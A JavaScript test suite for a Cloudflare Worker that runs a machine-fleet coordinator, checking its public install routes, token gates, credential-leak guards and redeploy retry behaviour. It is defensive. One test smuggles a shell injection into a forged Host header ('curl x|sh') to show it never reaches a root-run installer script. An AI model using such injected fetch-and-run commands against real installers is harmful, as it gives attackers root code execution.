// What the Worker answers WITHOUT a credential.
//
// Everything else in this file's routing is a gate; these four are the holes in
// it, and a hole nobody meant to leave is the failure worth catching. Each one
// is here for a stated reason, and the test is really "the list is still
// exactly this long".
//
// The Durable Object is never reached by any of them, so a stub that throws is
// the right binding: if one of these ever starts fetching the object, this
// fails loudly rather than quietly working.

import test from 'node:test';
import assert from 'node:assert/strict';

import worker from '../worker/src/worker.js';

/** A DO binding that must not be used. */
const noFleet = {
  idFromName() {
    throw new Error('the Durable Object was reached on an unauthenticated route');
  },
  get() {
    throw new Error('the Durable Object was reached on an unauthenticated route');
  },
};

/** @param {string} path */
const get = (path, env = {}) =>
  worker.fetch(new Request(`https://fleet.example${path}`), /** @type {any} */ ({ FLEET: noFleet, ...env }));

test('liveness needs nothing, and says nothing', async () => {
  const res = await get('/healthz');
  assert.equal(res.status, 200);
  const body = /** @type {any} */ (await res.json());
  assert.deepEqual(Object.keys(body).sort(), ['ok', 'protocol']);
  // No host names, no counts. A liveness endpoint that leaks the fleet is not
  // a liveness endpoint.
  assert.equal(JSON.stringify(body).includes('host'), false);
});

test('the privacy policy is public, because App Store Connect requires one', async () => {
  const res = await get('/privacy');
  assert.equal(res.status, 200);
  assert.match(String(res.headers.get('content-type')), /text\/html/);
});

test('the install one-liner carries this fleet\'s address into the installer', async () => {
  // A box being installed has no credential — acquiring one is what the install
  // is for — so this has to sit above the token gate.
  //
  // It used to be a 302. The redirect could not say WHICH FLEET: somebody types
  // `curl -fsSL https://fleet.example/install | sudo sh`, the address is right
  // there in what they typed, and curl follows the redirect and pipes a script
  // that has never heard of it. So the installer asked for a coordinator URL
  // the person had already given.
  const mine = 'https://raw.githubusercontent.com/someone/theirs/main/install/bootstrap.sh';
  for (const path of ['/install', '/install.sh']) {
    const res = await get(path, { AGENT_FLEET_INSTALL_URL: mine });
    assert.equal(res.status, 200, path);
    const body = await res.text();
    assert.match(body, /AGENT_FLEET_COORDINATOR_URL='https:\/\/fleet\.example'/, path);
    assert.ok(body.includes(mine), `${path} does not fetch the installer`);
    // Never cached: a stale shim is a box pointed at an address this fleet has
    // moved off.
    assert.equal(String(res.headers.get('cache-control')), 'no-store');
  }
});

test('the shim is six lines and no installer, so the source still lives in the repository', async () => {
  // The redirect's reasoning was "the thing people paste into a root shell
  // should be served by the place that has the source, so it cannot go stale
  // here and cannot be edited here either". That still holds and is the reason
  // this is a bound rather than a preference: everything except the address is
  // fetched, so a coordinator cannot quietly grow an installer.
  const res = await get('/install', { AGENT_FLEET_INSTALL_URL: 'https://example.invalid/bootstrap.sh' });
  const body = await res.text();
  assert.ok(body.split('\n').filter((l) => l.trim() && !l.trim().startsWith('#')).length <= 6,
    'the /install shim has grown installer logic');
  for (const installerish of ['apt-get', 'systemctl', 'podman', 'npm ', 'useradd']) {
    assert.equal(body.includes(installerish), false, `the shim is doing installer work: ${installerish}`);
  }
});

test('/prereq redirects to the prerequisite script beside the installer', async () => {
  // A redirect rather than a shim, and the difference is whether there is
  // anything to inject. /install generates six lines because it carries the
  // address somebody typed; a prerequisite is the same on every box, so the
  // old reasoning applies in full — served by the place that has the source,
  // so it cannot go stale here and cannot be edited here.
  const res = await get('/prereq', {
    AGENT_FLEET_INSTALL_URL: 'https://raw.githubusercontent.com/someone/theirs/main/install/bootstrap.sh',
  });
  assert.equal(res.status, 302);
  assert.equal(
    String(res.headers.get('location')),
    'https://raw.githubusercontent.com/someone/theirs/main/install/prereq.sh',
  );

  // DERIVED FROM THE INSTALL URL, so both come from one repository at one ref.
  // Running one fork's prerequisites and another's installer is not a state
  // anybody should be able to reach by configuration.
  const unset = await get('/prereq');
  assert.equal(unset.status, 404);
  assert.match(await unset.text(), /AGENT_FLEET_INSTALL_URL/);
});

test('the shim carries an address and never a credential', async () => {
  // THE ADDRESS IS NOT A SECRET — it is the URL somebody typed, and it is in
  // their shell history. Joining still costs a six-digit pin, minted by a
  // person in the app, short-lived and single-use.
  //
  // Asserted rather than assumed, because "the installer already knows the
  // coordinator, why not put a token in too" is the obvious next step and it is
  // the one that must never be taken. A static secret served to anybody who
  // curls /install would admit any machine on the internet to the fleet, which
  // is what AGENT_FLEET_HOST_TOKEN was and why it was removed.
  const res = await get('/install', {
    AGENT_FLEET_INSTALL_URL: 'https://example.invalid/bootstrap.sh',
    // Every credential this Worker can see, in case one is ever reached for.
    AGENT_FLEET_API_TOKEN: 'admin-token-value-here',
    AGENT_FLEET_GITHUB_CLIENT_SECRET: 'github-secret-value',
    AGENT_FLEET_AUTH_ALLOW: 'somebody@example.com',
  });
  const body = await res.text();

  for (const secret of ['admin-token-value-here', 'github-secret-value', 'somebody@example.com']) {
    assert.equal(body.includes(secret), false, `the installer shim leaked ${secret}`);
  }
  // And nothing shaped like one, so a NEW credential added to the Worker cannot
  // arrive here by being interpolated into a template somebody extends.
  assert.equal(/token|secret|_key|bearer|authorization|pin/i.test(body), false, `the shim mentions a credential: ${body}`);

  // It sets exactly one variable, and it is the address.
  const assignments = [...body.matchAll(/^([A-Z_]+)=/gm)].map((m) => m[1]);
  assert.deepEqual(assignments, ['AGENT_FLEET_COORDINATOR_URL']);
});

test('a forged Host header cannot reach the root shell', async () => {
  // Without AGENT_FLEET_PUBLIC_ORIGIN the origin is whatever the client sent,
  // and it is interpolated into a script that runs as root. normaliseOrigin
  // returns scheme://host:port and nothing else; the charset check is the
  // second lock on the same door.
  const res = await worker.fetch(
    new Request('https://fleet.example/install', { headers: { host: "evil'; curl x|sh; #" } }),
    /** @type {any} */ ({ FLEET: noFleet, AGENT_FLEET_INSTALL_URL: 'https://example.invalid/b.sh' }),
  );
  const body = await res.text();
  assert.equal(/curl x\|sh/.test(body), false, 'a Host header reached the script');

  // And a configured public origin always wins, so a deployment that sets one
  // never depends on the header at all.
  const pinned = await get('/install', {
    AGENT_FLEET_INSTALL_URL: 'https://example.invalid/b.sh',
    AGENT_FLEET_PUBLIC_ORIGIN: 'https://fleet.thetech.network',
  });
  assert.match(await pinned.text(), /AGENT_FLEET_COORDINATOR_URL='https:\/\/fleet\.thetech\.network'/);
});

test('an unconfigured coordinator publishes no installer at all', async () => {
  // THE ONE INHERITED CONSTANT THAT ENDS UP EXECUTING. This route hardcoded
  // upstream's raw URL, and bootstrap.sh clones the repository it came from —
  // so a fork's own coordinator, on a fork's own domain, handed a root shell a
  // script that installed SOMEBODY ELSE'S CODE. Silently, with nothing for the
  // person pasting it to notice.
  //
  // Refusing is the only safe default. Redirecting to upstream when unset would
  // keep the bug as the behaviour, and a working command that does the wrong
  // thing is worse than an error.
  const res = await get('/install');
  assert.equal(res.status, 404);
  const text = await res.text();
  // NAMES THE VARIABLE and says why it matters, because the person reading this
  // is the one who can set it and "not found" sends them nowhere.
  assert.match(text, /AGENT_FLEET_INSTALL_URL/);
  assert.match(text, /clones the repository it is served from/);
});



test('everything else refuses before the object is reached', async () => {
  // Not "we are careful" — the binding above throws, so this asserts that the
  // fleet is unreachable rather than merely unauthorised.
  for (const path of ['/api/hosts', '/api/intent', '/api/clients', '/api/enroll', '/']) {
    const res = await get(path, { AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' });
    assert.equal(res.status, 401, path);
  }
});

test('with no admin token configured it refuses everything and says which', async () => {
  const res = await get('/api/hosts');
  assert.equal(res.status, 503);
  assert.match(/** @type {any} */ ((await res.json()).text), /AGENT_FLEET_API_TOKEN/);
});

test('the admin token gets through, and a wrong one does not', async () => {
  // The other half of the check above, and the half that was broken: the gate
  // has to LET SOMETHING THROUGH. `expected` was deleted with the host token
  // while the comparison that used it stayed, so every authenticated request
  // threw ReferenceError — a Worker that refuses everybody looks a lot like a
  // Worker that is working, right up until nothing works.
  let reached = 0;
  const fleet = {
    idFromName: () => 'id',
    get: () => ({ fetch: async () => { reached++; return new Response('{"ok":true}'); } }),
  };
  const env = { FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' };

  const good = await worker.fetch(
    new Request('https://fleet.example/api/hosts', { headers: { authorization: 'Bearer a-token-at-least-16ch' } }),
    /** @type {any} */ (env),
  );
  assert.equal(good.status, 200);
  assert.equal(reached, 1);

  const bad = await worker.fetch(
    new Request('https://fleet.example/api/hosts', { headers: { authorization: 'Bearer nope' } }),
    /** @type {any} */ (env),
  );
  assert.equal(bad.status, 401);
  assert.equal(reached, 1, 'and it never reached the object');
});

test('a device credential is passed to the object rather than refused here', async () => {
  // The Durable Object holds the client registry, so it is the only thing that
  // can say whether an fwk_ token is live. The Worker must not guess.
  let reached = 0;
  const fleet = {
    idFromName: () => 'id',
    get: () => ({ fetch: async () => { reached++; return new Response('{"ok":true}'); } }),
  };
  const res = await worker.fetch(
    new Request('https://fleet.example/api/hosts', { headers: { authorization: 'Bearer fwk_abc_def' } }),
    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
  );
  assert.equal(res.status, 200);
  assert.equal(reached, 1);
});

test('host routes reach the object without any token at all', async () => {
  // They authenticate by signature, inside the object, which is the only thing
  // holding the enrolled keys.
  let reached = [];
  const fleet = {
    idFromName: () => 'id',
    get: () => ({ fetch: async (/** @type {Request} */ r) => { reached.push(new URL(r.url).pathname); return new Response('{}'); } }),
  };
  const env = /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' });
  for (const path of ['/host/connect', '/api/host/challenge', '/api/host/verify', '/api/enroll/host']) {
    await worker.fetch(new Request(`https://fleet.example${path}`), env);
  }
  assert.deepEqual(reached, ['/host/connect', '/api/host/challenge', '/api/host/verify', '/api/enroll/host']);
});

// --- the credential is read once ---------------------------------------------

import { Fleet } from '../worker/src/fleet-do.js';

/** The Worker with a REAL Durable Object behind it, not a stub. */
function wired() {
  const storage = new Map();
  const state = {
    storage: {
      get: async (/** @type {string} */ k) => storage.get(k),
      put: async (/** @type {string} */ k, /** @type {any} */ v) => storage.set(k, JSON.parse(JSON.stringify(v))),
    },
    blockConcurrencyWhile: (/** @type {() => any} */ fn) => fn(),
    getWebSockets: () => [],
    setAlarm: () => {},
  };
  const fleet = new Fleet(/** @type {any} */ (state), {});
  return {
    fleet,
    env: /** @type {any} */ ({
      FLEET: { idFromName: () => 'id', get: () => fleet },
      AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch',
    }),
  };
}

test('the four characters fwk_ in a query parameter are not a credential', async () => {
  // They were. worker.js accepted `?token=` as well as the header; the Durable
  // Object read the header and only the header. So `?token=fwk_` passed the
  // Worker's "this looks like a device credential, let the object judge it"
  // check and reached an object that saw no credential, judged nothing and
  // answered — list hosts, send intents, mint pins, revoke machines.
  //
  // Wired to a REAL Fleet object rather than a stub, because a stub would have
  // answered 200 to all of this and proved nothing.
  const { env } = wired();
  for (const token of ['fwk_', 'fwk_x', 'fwk_anything_at_all', 'fwk_0000000000_0000000000']) {
    const res = await worker.fetch(new Request(`https://fleet.example/api/hosts?token=${token}`), env);
    assert.equal(res.status, 401, token);
  }
});

test('a real device credential still works both ways round', async () => {
  // The query form is not a mistake to be removed — §7 wants a Shortcut to be
  // able to call this through "Get Contents of URL", which cannot set headers.
  const { fleet, env } = wired();
  const { token } = await fleet.core.clients.issue('a phone (someone@example.com)');

  const query = await worker.fetch(new Request(`https://fleet.example/api/hosts?token=${token}`), env);
  assert.equal(query.status, 200);

  const header = await worker.fetch(
    new Request('https://fleet.example/api/hosts', { headers: { authorization: `Bearer ${token}` } }),
    env,
  );
  assert.equal(header.status, 200);
});

test('a revoked credential is refused in the query form too', async () => {
  const { fleet, env } = wired();
  const { token, client } = await fleet.core.clients.issue('a lost phone (someone@example.com)');
  fleet.core.clients.revoke(client.id);

  const res = await worker.fetch(new Request(`https://fleet.example/api/hosts?token=${token}`), env);
  assert.equal(res.status, 401);
});

test('the privacy policy describes the app that exists', async () => {
  // It is the URL App Store Connect points at, and it predated sign-in: it said
  // Fleetwright collects nothing, that there is no account, and that you type an
  // API token into Settings. All three became false, and it contradicted the
  // Data Safety declaration in apps/android/store/store-listing.md.
  const res = await get('/privacy');
  const html = await res.text();

  for (const required of ['email', 'Keychain', 'Share My Email', 'sign in']) {
    assert.ok(html.toLowerCase().includes(required.toLowerCase()), `does not mention ${required}`);
  }
  assert.equal(html.includes('collects nothing'), false, 'it collects an email address now');
  assert.equal(/API token you enter/.test(html), false, 'nobody types a token any more');
});

// --- a deploy landing mid-request -------------------------------------------

test('a Durable Object reset replays a safe request instead of failing it', async () => {
  // EVERY WORKER DEPLOY EVICTS LIVE DURABLE OBJECTS. Cloudflare throws
  // "Durable Object reset because its code was updated." into whatever was in
  // flight; there is nothing wrong with the object. It arrived as this fleet's
  // first production error report, on /api/host/challenge, from a host that
  // reconnected seconds later on its own.
  //
  // The bug was the ANSWER, not the event: an unhandled throw became a 500.
  let attempts = 0;
  const fleet = {
    idFromName: () => 'id',
    get: () => ({
      fetch: async () => {
        attempts++;
        if (attempts === 1) throw new Error('Durable Object reset because its code was updated.');
        return new Response('{"ok":true,"nonce":"abc"}', { status: 200 });
      },
    }),
  };
  const res = await worker.fetch(
    new Request('https://fleet.example/api/host/challenge', { method: 'POST', body: '{"hostId":"deb132"}' }),
    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
  );
  assert.equal(res.status, 200);
  assert.equal(attempts, 2, 'the request should have been replayed once');
  assert.match(await res.text(), /nonce/);
});

test('a request that cannot be safely replayed gets 503 and a Retry-After', async () => {
  // WHY NOT RETRY EVERYTHING. The reset arrives with no way to know whether the
  // object had already acted. Replaying /api/enroll spends a single-use pin
  // twice; replaying a `start` intent from a caller with no idempotency id runs
  // two sessions. "It may or may not have happened, come back" is the honest
  // answer, and a caller that knows to come back is better served than one
  // handed a 500 and a guess.
  const fleet = {
    idFromName: () => 'id',
    get: () => ({
      fetch: async () => {
        throw new Error('Durable Object reset because its code was updated.');
      },
    }),
  };
  const res = await worker.fetch(
    new Request('https://fleet.example/api/intent', {
      method: 'POST',
      body: '{"verb":"start"}',
      headers: { authorization: 'Bearer a-token-at-least-16ch' },
    }),
    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
  );
  assert.equal(res.status, 503);
  assert.equal(res.headers.get('retry-after'), '2');
  const body = /** @type {any} */ (await res.json());
  assert.equal(body.error.code, 'restarting');
  assert.match(body.text, /Nothing was lost/);
});

test('a real failure is still a real failure', async () => {
  // Matching on the message is how these are recognised, so the match has to be
  // narrow. Anything broader would swallow a genuine fault and retry it, which
  // is how a bug becomes a bug that happens twice.
  const fleet = {
    idFromName: () => 'id',
    get: () => ({
      fetch: async () => {
        throw new TypeError('undefined is not a function');
      },
    }),
  };
  // It used to assert the throw PROPAGATED, which was the right test until the
  // top-level guard started answering JSON — a Worker that throws hands the
  // caller a Cloudflare error page, and no client can read one.
  //
  // The property that matters is unchanged and is what this asserts now: a real
  // fault is NOT mistaken for a Durable Object reset and quietly retried. It
  // comes back as an internal error, once.
  const res = await worker.fetch(
    new Request('https://fleet.example/api/host/challenge', { method: 'POST', body: '{}' }),
    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
  );
  assert.equal(res.status, 500);
  const body = /** @type {any} */ (await res.json());
  assert.equal(body.error.code, 'internal');
  assert.equal(body.error.code === 'restarting', false, 'a genuine fault was treated as a redeploy');
});

// --- a throw is never an HTML error page ------------------------------------

test('an unhandled throw answers JSON, not a Cloudflare error page', async () => {
  // A beta tester got `Unexpected token 'e', "error code: 1101" is not valid
  // JSON` from an MCP call. 1101 is Cloudflare's "the Worker threw", and what
  // reaches the caller is Cloudflare's error PAGE — so every JSON client gets a
  // parse error naming a token and has to work backwards from a five-character
  // code to "something crashed upstream".
  //
  // This does not fix the throw (#313 is still unexplained and unreproduced).
  // It fixes the shape: a caller gets a reason, and the exception still reaches
  // the reporter.
  const fleet = {
    idFromName: () => 'id',
    get: () => ({
      fetch: async () => {
        throw new TypeError('something upstream exploded');
      },
    }),
  };
  const res = await worker.fetch(
    new Request('https://fleet.example/api/hosts', { headers: { authorization: 'Bearer a-token-at-least-16ch' } }),
    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
  );
  assert.equal(res.status, 500);
  const body = /** @type {any} */ (await res.json());
  assert.equal(body.error.code, 'internal');
  // Says whose fault it is, and that retrying will not help — the two facts the
  // parse error withheld.
  assert.match(body.text, /fault here/);
  assert.match(body.text, /do it again/);
});
